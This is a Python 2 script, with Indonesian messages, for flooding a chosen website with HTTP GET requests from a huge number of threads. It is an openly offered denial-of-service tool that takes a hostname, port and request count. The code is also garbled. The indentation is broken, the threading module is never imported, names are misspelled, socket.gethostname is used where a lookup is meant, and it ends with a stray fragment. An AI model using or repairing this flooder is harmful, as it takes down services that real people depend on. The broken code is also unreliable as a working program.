

import random
import socket
import string
import sys
import time



# parse input

host = " "
ip = " "
port = 0
num_requests = 0

if len(sys.argv) == 2:
	port = 80
	num_requests = 1000000000
elif len(sys.argv) == 3:
	port = int(sys.argv[2])
	num_requests = 1000000000
elif len(sys.argv) == 4:
	port = int(sys.argv[2])
	num_requests = int (sys.argv[3])
else:
	print "ERROR\n Gunakan: " + sys.argv[0] + "< Hostname > < Port > < Jumlah Serangan >"
	sys.exit(1)


	try:
		host = str(sys.argv[1]).replace("https://", " ").replace("http://", " ").replace("www.", " ")
		ip = socket.gethostname(host)
	except socket.galerror:
		print " ERROR\n Pastikan Lu masukin Website Yang Benar Asw"
		sys.exit(2)


		thread_num = 0
		thread_num_mutex = threading.Lock()



		def print_status():
			global thread_num
			thread_num_murtex.acquire(True)

			thread_num += 1
			print "\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] #-#-#-#-# Serangan Sedang Dilakukan Todddd#-#-#-#-#"

			thread_num_murtex.release()



		def generate_url_path():
			msg = str(string.letters + string.digits + string.punctuation)
			data = " ".join(random.sample(msg,5))
			return data

def attack():
	print_status()
	url_path = generate_url_path()

	dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		dos.connect((ip, port))

		dos.send("GET /%s HTTP/1.1\nHOST: %s\n\n" % (url_path, host))
	except socket.error, e:
	print "\n [Tidak Ada Koneksi Cok Atau Servernya Kemungkinan Down ]: " + str(e)
finally:
	dos.shutdown(socket.SHUT_RDWP)
	dos.close()


print "[#] Attack Strarted on " + host + " (" + ip + ") || #Requests: " + str(num_requests)

all_threads = []

for i in xrange(num_requests):
	tl = threading.Theard(target=attack)
	tl.start()
	all_threads.append(tl)


	time.sleep(0.01)

for current_thread in all_threads:
	current_thread.join()













str(port) + " || # Request: " +str(num_requests)		













	



	





